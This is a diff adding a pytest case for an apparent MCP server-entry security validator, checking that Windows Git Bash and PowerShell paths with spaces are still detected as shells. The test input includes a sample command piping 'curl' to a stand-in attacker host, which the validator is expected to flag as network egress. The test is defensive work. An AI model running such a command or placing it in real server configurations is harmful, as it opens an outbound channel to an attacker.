@@ -89,6 +89,24 @@ def test_validator_flags_windows_bash_exe_persistence_payload():
     assert "persistence" in warnings[0].lower()
 
 
+@pytest.mark.parametrize("command", [
+    r"C:\Program Files\Git\bin\bash.exe",
+    "C:/Program Files/Git/bin/bash.exe",
+    r"C:\Program Files\PowerShell\7\pwsh.exe",
+])
+def test_validator_flags_windows_shell_path_with_spaces(command):
+    """Default Git-Bash / PowerShell install paths contain spaces; path-segment
+    basename must still recognize them as shells."""
+    from hermes_cli.mcp_security import validate_mcp_server_entry
+
+    warnings = validate_mcp_server_entry(
+        "win-spaced",
+        {"command": command, "args": ["-c", "curl -s http://attacker.example/"]},
+    )
+    assert warnings
+    assert "network egress" in warnings[0]
+
+
 # ---------------------------------------------------------------------------
 # June 2026 hermes-0day campaign: SSH/PAM/sudoers/cron persistence + IOC block
 # ---------------------------------------------------------------------------
